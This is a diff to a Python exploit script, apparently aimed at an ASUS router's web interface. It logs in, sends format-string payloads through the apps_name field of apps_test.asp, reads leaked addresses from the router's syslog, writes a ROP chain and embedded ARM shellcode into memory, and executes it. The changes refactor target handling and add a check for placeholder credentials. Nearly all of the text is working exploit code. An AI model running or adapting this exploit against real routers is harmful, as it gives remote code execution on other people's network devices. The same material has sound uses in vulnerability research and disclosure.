@@ -24,20 +24,23 @@ from time import sleep
 #   auth
 
 client = requests.Session()
+target = "http://TARGET/"
+auth = b"USER:PASSWORD"
+
 proxy = {"http":"http://127.0.0.1:8080"}
 
 hdrs = {
     "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36",
-    "Referer":"http://TARGET/Main_Login.asp"
+    "Referer": target + "Main_Login.asp"
 }
 
-target = "http://192.168.1.200/apps_test.asp"
+
+
 shellcode =  b"\x01\x60\x8f\xe2\x16\xff\x2f\xe1\x78\x46\x10\x30\xff\x21\xff\x31\x01\x31\x08\x27\x01\xdf\x40\x40\x01\x27\x01\xdf\x2f\x72\x6f\x6f\x74\x2f\x70\x77\x6e\x65\x64"
 
 def login():
-    auth = b"USER:PASSWORD"
     auth64 = base64.b64encode(auth)
-    login = "http://192.168.1.200/login.cgi"
+    login = target + "login.cgi"
     login_body = {
         "group_id":"",
         "action_mode":"",
@@ -74,13 +77,13 @@ def leakMemory():
 
     for payload in payloads:
         leak_payload["apps_name"] = payload
-        response = client.post(target, headers=hdrs, data=leak_payload)
+        response = client.post(target + "apps_test.asp", headers=hdrs, data=leak_payload)
 
     return parseSyslog()
 
 
 def parseSyslog():
-    response = client.get("http://192.168.1.200/ajax_log_data.asp", headers=hdrs)
+    response = client.get(target + "ajax_log_data.asp", headers=hdrs)
 
     print("[*] Searching syslog for addresses...")
     # First, get the PID, need to know this for the right initial padding
@@ -148,13 +151,13 @@ def writeMemory(targetBuffer, targetRetAddress, pid, sc_padded, ret_padded, null
     # Send em
     c = 1
     for payload in payloads:
-        print("[+] Payload: " + str(payload))
+       # print("[+] Payload: " + str(payload))
         write_payload = {
             "apps_action": "install",
             "apps_name": payload,
             "apps_flag": "A "
         }
-        response = client.post(target, headers=hdrs, data=write_payload)
+        response = client.post(target + "apps_test.asp", headers=hdrs, data=write_payload)
         print("[+] Sent payload %d, sleeping 5..." % c)
         sleep(5)
         c += 1
@@ -184,7 +187,7 @@ def writeMemory(targetBuffer, targetRetAddress, pid, sc_padded, ret_padded, null
     }
 
     print("[+] Shellcode written, beginning rop execution...")
-    response = client.post(target, headers=hdrs, data=write_payload, proxies=proxy)
+    response = client.post(target + "apps_test.asp", headers=hdrs, data=write_payload)
 
 # Function to create the rop chain, because we are converting into format string
 # padding bytes, we don't need to worry about null-bytes, score!
@@ -369,8 +372,11 @@ def padCalc(sc_words, offset, base):
 
 def main():
     if len(sys.argv) < 2:
-        print("[!] Usage: ./exploit.py TARGET-IP")
-        sys.exit(-1)
+        print("[!] No target specified! Example Usage: \n\tpython3 ./asus-stringFormat.py http://192.168.1.1/ ")
+        sys.exit(1)
+    if auth == b"USER:PASSWORD":
+        print("[!] Change auth info first!")
+        sys.exit(1)
 
     loggedIn = login()
     if loggedIn != -1:
